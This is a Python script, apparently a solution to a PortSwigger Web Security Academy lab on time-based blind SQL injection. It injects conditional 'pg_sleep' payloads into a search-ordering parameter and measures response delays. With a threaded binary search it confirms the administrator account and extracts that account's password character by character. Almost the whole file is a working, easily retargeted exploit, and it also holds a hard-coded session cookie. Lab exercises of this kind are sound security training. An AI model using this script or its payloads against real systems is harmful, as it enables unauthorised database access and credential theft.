# https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval#

import requests
import time
from concurrent.futures import ThreadPoolExecutor

username = "administrator"
ascii_wordlist = list(range(32, 127))
response_timeout = 10
max_password_length = 40

# Concurrencia baja para no saturar el pool de conexiones del lab (evita
# falsos positivos por contencion). Subelo con cuidado si el lab lo aguanta.
max_workers = 4
# Umbral a mitad de camino entre ~0s (condicion falsa) y ~10s (condicion
# verdadera): robusto frente al jitter en ambas direcciones.
delay_threshold = response_timeout / 2

url = "https://0a5b00d60374f289801bda40002300cd.web-security-academy.net:443/"
headers = {"Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Referer": "https://0a0a000804382a678088084a007c00cd.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
session = "rQCQGYoU5sY6WkfpHSVHsUeFLFfmZPsn"


def add_delay_if_sql_query_is_working(query_sql: str) -> str:
    return f"SELECT CASE WHEN {query_sql} THEN pg_sleep({response_timeout}) ELSE pg_sleep(0) END--"


def query_causes_delay(sql_condition: str) -> bool:
    """Ejecuta la condicion via SQLi y devuelve True si la respuesta se retraso
    (es decir, la condicion fue verdadera). Cada hilo usa su propia Session."""
    sql_query = add_delay_if_sql_query_is_working(sql_condition)
    path = f"/advanced_search?SearchTerm=&organize_by=DATE;{sql_query}&blogArtist=Si+Test"
    cookies = {"session": session}
    with requests.Session() as s:
        t_start = time.time()
        s.get(url + path, headers=headers, cookies=cookies, timeout=response_timeout + 20)
        t_diff = time.time() - t_start
    return t_diff > delay_threshold


def exists_user(username: str) -> bool:
    return query_causes_delay(
        f"(SELECT COUNT(*) FROM users WHERE username = '{username}') > 0"
    )


def password_length_is_greater_than(username: str, index: int) -> bool:
    return query_causes_delay(
        f"(SELECT LENGTH(password) FROM users WHERE username = '{username}') > {index}"
    )


def character_is_greater_than(username: str, character: str, index: int) -> bool:
    return query_causes_delay(
        f"((SELECT ASCII(SUBSTR(password, {index}, 1)) FROM users WHERE username = '{username}')) > {ord(character)}"
    )


def binary_search(values, is_greater_than):
    low = 0
    high = len(values) - 1
    while low < high:
        mid = (low + high) // 2
        if is_greater_than(values[mid]):
            low = mid + 1
        else:
            high = mid
    return values[low]


def resolve_character(index: int) -> str:
    """Resuelve el caracter en una posicion concreta mediante busqueda binaria.
    Esta funcion es la que corre en cada hilo."""
    code = binary_search(
        ascii_wordlist,
        lambda x: character_is_greater_than(username, chr(x), index),
    )
    character = chr(code)
    print(f"[+] Indice {index:>2} -> '{character}'")
    return character


if not exists_user(username):
    print(f"User {username} does not exist")
    exit()
print(f"User {username} exists")

length = binary_search(
    range(1, max_password_length),
    lambda x: password_length_is_greater_than(username, x),
)
print(f"Password length: {length}")

start = time.time()

# Un hilo por cada caracter de la contrasena. Cada hilo hace su propia
# busqueda binaria (secuencial internamente), pero todas las posiciones
# se resuelven en paralelo. Luego reconstruimos en orden por indice.
with ThreadPoolExecutor(max_workers=max_workers) as executor:
    indices = range(1, length + 1)
    characters = list(executor.map(resolve_character, indices))

password = "".join(characters)
print(f"\nPassword: {password}")
print(f"Tiempo total: {time.time() - start:.1f}s")
